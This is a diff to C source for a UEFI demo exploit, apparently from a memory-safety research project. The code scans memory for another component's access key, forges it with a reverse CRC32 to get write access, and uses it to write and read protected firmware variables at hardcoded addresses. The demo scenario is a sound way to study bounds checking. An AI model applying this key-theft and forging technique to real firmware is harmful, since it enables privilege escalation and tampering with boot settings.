@@ -76,7 +76,9 @@ ScanMemory(
         Address = (UINTN *)addr;
         UINTN* _Array CheckedAddress _Bounds(&DataToProvide, &DataToProvide + sizeof(DataToProvide)) = NULL;
         CheckedAddress = _Assume_bounds_cast_M(VOID* _Array, (UINTN*)addr, _Bounds(&DataToProvide, &DataToProvide + sizeof(DataToProvide)));
-        Status = BobProtocol->Demo1BobDataProvider(BobProtocol, CheckedAddress, (VOID *_Array *)&Data, searchValueLength);
+//        UINTN* _Array CheckedAddress _Byte_count(size) = NULL;
+//        CheckedAddress = _Assume_bounds_cast_M(VOID* _Array, (UINTN*)addr, _Byte_count(size));
+        Status = BobProtocol->Demo1BobDataProvider(BobProtocol, CheckedAddress, (VOID *_Array *)&Data, size);
         if(Status == EFI_SUCCESS)
         {
             if(CompareMem((VOID*)Data, searchValue, searchValueLength) == 0)
@@ -110,6 +112,9 @@ Demo1Exploit_Entry (
     gBS->LocateProtocol(&gDemo1AccessKeyProtocolGuid, NULL, (VOID *)&AccessKeyProtocol);
     DEMO1_ACCESS_KEY * _Single my_access_key=AllocatePool(sizeof(DEMO1_ACCESS_KEY));
     // Known key address for Bob so find get the key stored there
+
+
+
     UINTN *Address = NULL;
     UINTN Size = sizeof(DEMO1_ACCESS_KEY);
     DEMO1_ACCESS_KEY *Data;
@@ -120,11 +125,13 @@ Demo1Exploit_Entry (
         Address = (UINTN *)addr;
         UINTN* _Array CheckedAddress _Bounds(&DataToProvide, &DataToProvide + sizeof(DataToProvide)) = NULL;
         CheckedAddress = _Assume_bounds_cast_M(VOID* _Array, (UINTN*)addr, _Bounds(&DataToProvide, &DataToProvide + sizeof(DataToProvide)));
+//        UINTN* _Array CheckedAddress _Byte_count(Size) = NULL;
+//        CheckedAddress = _Assume_bounds_cast_M(VOID* _Array, (UINTN*)addr, _Byte_count(Size));
         Status = BobProtocol->Demo1BobDataProvider(BobProtocol, CheckedAddress, (VOID *_Array *)&Data, Size);
         if(Status == EFI_SUCCESS)
         {
-            if(CompareMem((VOID*)&(Data->access_key_store[1]), &searchValue, sizeof(searchValue)) == 0)
-            //if(Data->access_key_store[1] == 0xDEC0DEBABB1E10AD)
+            //if(CompareMem((VOID*)&(Data->access_key_store[1]), &searchValue, sizeof(searchValue)) == 0)
+            if(Data->access_key_store[1] == 0xDEC0DEBABB1E10AD)
             {
                 Address = (UINTN *)addr;
                 Print(L"Found Bobs Key: (0x%016llx..%016llx) \r\n", Data->access_key_store[0], Data->access_key_store[1]);
@@ -142,8 +149,6 @@ Demo1Exploit_Entry (
     UINT32 RevOut = ReverseCRC32(Header_Value);
     gBS->CalculateCrc32(&RevOut, 4, (UINT32 *)&(Data->access_key_store[1]));
     Print(L"Modified Key: (0x%016llx..%016llx) \r\n", Data->access_key_store[0], Data->access_key_store[1]);
-    // Change key from read to write
-    //Data->access_key_store[1] = (ACCESS_KEY_MAGIC << MAGIC_SIZE) + WRITE_ACCESS;
     Print(L"Modified key to have write access");
     // Write to
     UINTN ExampleVar_Value = 0;
@@ -155,7 +160,8 @@ Demo1Exploit_Entry (
             EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE,
             Data,
             BufferSize,
-            &ExampleVar_Value
+            &ExampleVar_Value,
+            imgHandle
     );
     if (EFI_ERROR (Status)) {
         DEBUG ((DEBUG_ERROR, "%a: variable '%s' could not be written - bailing!\n", __FUNCTION__, ALICEMODE_VARNAME));
@@ -172,7 +178,8 @@ Demo1Exploit_Entry (
     Print(L"Failed to generate access key...Success\r\n");
     //Change accessKeyLock
     Print(L"Attempting to write to accessKeyLock\r\n");
-    UINTN *getExampleVar_Value = (UINTN *)((UINTN)Address + 0x6E78);// accessKeyLock
+    UINTN *getExampleVar_Value ;
+    getExampleVar_Value = (UINTN *)0x70D3B40;// accessKeyLock
     Print (L"AccessKeyLock Address: 0x%016llx\n", getExampleVar_Value);
     BufferSize = sizeof(getExampleVar_Value);
     Status = gST->RuntimeServices->GetAccessVariable (
@@ -181,7 +188,8 @@ Demo1Exploit_Entry (
             NULL,
             Data,
             &BufferSize,
-            getExampleVar_Value
+            getExampleVar_Value,
+            imgHandle
     );
     if (EFI_ERROR (Status)) {
         DEBUG ((DEBUG_ERROR, "%a: variable '%s' could not be read - bailing!\n", __FUNCTION__, EXAMPLEAPP_VARNAME));
